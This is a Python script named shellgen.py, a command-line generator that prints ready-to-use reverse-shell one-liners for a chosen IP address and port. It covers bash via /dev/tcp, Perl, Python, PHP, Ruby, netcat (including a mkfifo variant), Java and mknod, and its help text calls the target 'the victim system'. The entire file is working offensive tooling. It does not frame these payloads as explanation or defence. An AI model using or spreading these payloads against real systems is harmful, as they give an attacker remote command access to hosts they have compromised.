#Author : arslanblcn

import argparse
from colorama import Fore

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ipaddr", required=False, help= "IP address")
parser.add_argument("-p", "--port", required=False, help = "Port number", type = int)
parser.add_argument("-t", "--target", required=False, help = " Type of script for Reverse shell", type = str)
parser.add_argument("-l", "--list", required=False, help = "List of scripts", action="store_true")
parsValue = parser.parse_args()

def welcome():
    print(f""""
        {Fore.BLUE}usage: shellgen.py [-h] -i IPADDR -p PORT -t TARGET [-l LIST] 
        {Fore.WHITE}Example usage: 
        {Fore.BLUE}python3 shellgen.py -i 10.0.0.2 -p 1337 -t bash 
        {Fore.BLUE}python3 shellgen.py -l
        """)

def listRshell():
    print(f"""
        {Fore.GREEN}[+] bash - Bash reverse shell
        {Fore.GREEN}[+] perl - Perl reverse shell
        {Fore.GREEN}[+] python - Python reverse shell
        {Fore.GREEN}[+] php - PHP reverse shell
        {Fore.GREEN}[+] ruby - Ruby reverse shell
        {Fore.GREEN}[+] nc - Netcat reverse shell
        {Fore.GREEN}[+] java - Java reverse shell
        {Fore.GREEN}[+] mknod - Netcat alternative reverse shell if the victim system has nc wrong version
    """)
    welcome()


if parsValue.target == 'bash':
    print(f'{Fore.LIGHTYELLOW_EX}bash -i >& /dev/tcp/{parsValue.ipaddr}/{parsValue.port} 0>&1')

if parsValue.target == 'perl':
    print(f'{Fore.LIGHTYELLOW_EX}perl -e \'use Socket;$i="{parsValue.ipaddr}";'
          f'{Fore.LIGHTYELLOW_EX}$p={parsValue.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
          f'{Fore.LIGHTYELLOW_EX}if(connect(S,sockaddr_in($p,inet_aton($i))))'
          f'{Fore.LIGHTYELLOW_EX}{{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'')

if parsValue.target == 'python':
    print(f'{Fore.LIGHTYELLOW_EX}python -c \'import socket,subprocess,os;'
          f'{Fore.LIGHTYELLOW_EX}s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
          f'{Fore.LIGHTYELLOW_EX}s.connect(("{parsValue.ipaddr}",{parsValue.port});os.dup2(s.fileno(),0);'
          f'{Fore.LIGHTYELLOW_EX}os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
          f'{Fore.LIGHTYELLOW_EX}p=subprocess.call(["/bin/sh","-i"]);\'')

if parsValue.target == 'php':
    print(f'{Fore.LIGHTYELLOW_EX}php -r \'$sock=fsockopen("{parsValue.ipaddr}",{parsValue.port});'
          f'{Fore.LIGHTYELLOW_EX}exec("/bin/sh -i <&3 >&3 2>&3");\'')

if parsValue.target == 'ruby':
    print(f'{Fore.LIGHTYELLOW_EX}ruby -rsocket -e\'f=TCPSocket.open("{parsValue.ipaddr}",{parsValue.port}).to_i;'
          f'{Fore.LIGHTYELLOW_EX}exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'')

if parsValue.target == 'nc':
    print(f'{Fore.LIGHTYELLOW_EX}nc -e /bin/sh {parsValue.ipaddr} {parsValue.port}')
    print(f'{Fore.RED}[!] If there is wrong nc version try this')
    print(f'{Fore.LIGHTYELLOW_EX}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {parsValue.ipaddr} {parsValue.port} >/tmp/f')

if parsValue.target == 'java':
    print(f'{Fore.LIGHTYELLOW_EX}r = Runtime.getRuntime() \n'
          f'{Fore.LIGHTYELLOW_EX}p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{parsValue.ipaddr}/{parsValue.port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'
          f'{Fore.LIGHTYELLOW_EX}p.waitFor()')

if parsValue.target == 'mknod':
    print(f'{Fore.LIGHTYELLOW_EX}mknod /tmp/backpipe p;'
          f'{Fore.LIGHTYELLOW_EX}/bin/sh 0</tmp/backpipe | nc {parsValue.ipaddr} {parsValue.port} 1>/tmp/backpipe')

if parsValue.list == True:
    listRshell()
